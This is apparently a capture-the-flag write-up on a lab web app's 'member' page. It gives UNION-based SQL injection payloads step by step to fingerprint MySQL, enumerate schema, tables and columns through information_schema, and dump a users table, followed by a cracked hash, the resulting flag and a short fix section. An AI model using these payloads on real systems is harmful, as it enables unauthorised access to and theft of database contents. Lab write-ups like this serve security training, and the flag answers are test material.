# member sql injection
http://192.168.122.111/index.php?page=member

## How to get flag
This page is supposed to show members's info depends on members's id.
```
http://192.168.122.111/index.php?page=member&id=1&Submit=Submit#
```

1. Fingerprinting MySQL
type single quote(') to generate error message or type `1 /*! and 1=0 */`. Only MySQL interprete this.

2. Version 5.5.44
```
1 AND 1=0 UNION SELECT 1, version()
```

3. Login user, DB name, Schema & Table list
```
1 AND 1=0 UNION SELECT 1, DATABASE()
1 AND 1=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE()
1 AND 1=0 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=DATABASE()
```

result
```
DB / Schema : Member_Sql_Injection
table : users
columns : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
```

4. Find flag
```
1 AND 1=0 UNION SELECT 1, concat(Commentaire, countersign) FROM users
// Decrypt this password -> then lower all the char. Sh256 on it and it's good !
// 5ff9d0165b4f92b14994e5c685cdce28
```
decrypted with https://hashtoolkit.com/ : FortyTwo
lower all char : fortytwo
sh256 : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


## Vulnerability
Hacker can get any data from db. 

## How to Fix
1. Fingerprinting the Database : Don't show error message
2. Don't construct queries with user-provided data. Use PDO instead if it is PHP. 

## Resouces
(Testing for SQL Injection)[https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html]
(Testing for MySQL)[https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.html]